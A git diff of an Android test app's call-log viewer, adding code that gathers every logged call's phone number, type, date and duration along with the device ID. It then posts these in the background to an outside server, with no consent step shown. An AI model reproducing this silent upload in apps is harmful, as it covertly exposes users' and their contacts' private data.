@@ -2,10 +2,13 @@ package com.federation.funf_test;
 
 import android.Manifest;
 import android.app.Activity;
+import android.app.ProgressDialog;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.provider.CallLog;
+import android.provider.Settings;
 import android.util.Log;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
@@ -14,6 +17,10 @@ import android.widget.Toast;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
+
+import org.apache.http.message.BasicNameValuePair;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.util.ArrayList;
 import java.util.Date;
@@ -27,6 +34,13 @@ import static android.content.ContentValues.TAG;
 public class CallLogActivity extends Activity {
 
     ListView callLogListView;
+
+    ArrayList params = new ArrayList();
+    ArrayList<JSONObject> callLogArrayList= new ArrayList<>();
+    JSONParser jsonParser = new JSONParser();
+    private static String url_create = "https://pos.pentacle.tech/api/call/create";
+    private static final String TAG_SUCCESS = "success";
+    String androidId;
 
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
@@ -70,7 +84,6 @@ public class CallLogActivity extends Activity {
 
 
     private String getCallDetails() {
-
         StringBuffer sb = new StringBuffer();
         Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                 null, null, null);
@@ -104,6 +117,23 @@ public class CallLogActivity extends Activity {
                     + dir + " \nCall Date:--- " + callDayTime
                     + " \nCall duration in sec :--- " + callDuration);
             sb.append("\n----------------------------------");
+
+            JSONObject newCall = new JSONObject();
+
+            androidId = Settings.Secure.getString(getContentResolver(),
+                    Settings.Secure.ANDROID_ID);
+
+            try {
+                newCall.put("device_id", androidId);
+                newCall.put("phone_number", phNumber);
+                newCall.put("type", dir);
+                newCall.put("called_at", callDate);
+                newCall.put("duration", callDuration);
+
+                callLogArrayList.add(newCall);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
         }
         managedCursor.close();
         return sb.toString();
@@ -119,5 +149,41 @@ public class CallLogActivity extends Activity {
         ArrayAdapter arrayAdapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, callArrayList);
 
         callLogListView.setAdapter(arrayAdapter);
+
+        params.add(new BasicNameValuePair("device_id", androidId));
+        params.add(new BasicNameValuePair("call_list", callLogArrayList.toString()));
+        new CreateNewResult().execute();
+    }
+
+    class CreateNewResult extends AsyncTask<String, String, JSONObject> {
+        /**
+         * Before starting background thread Show Progress Dialog
+         */
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+
+        }
+
+        /**
+         * Creating product
+         */
+        protected JSONObject doInBackground(String... args) {
+            // getting JSON Object
+            // Note that create product url accepts POST methodN
+            JSONObject json = jsonParser.makeHttpRequest(url_create,
+                    "POST", params);
+            // check log cat fro response
+            //Log.d("Debug", json.toString());
+
+            return json;
+        }
+
+        /**
+         * After completing background task Dismiss the progress dialog
+         **/
+        protected void onPostExecute(JSONObject file_url) {
+            // dismiss the dialog once done
+        }
     }
 }
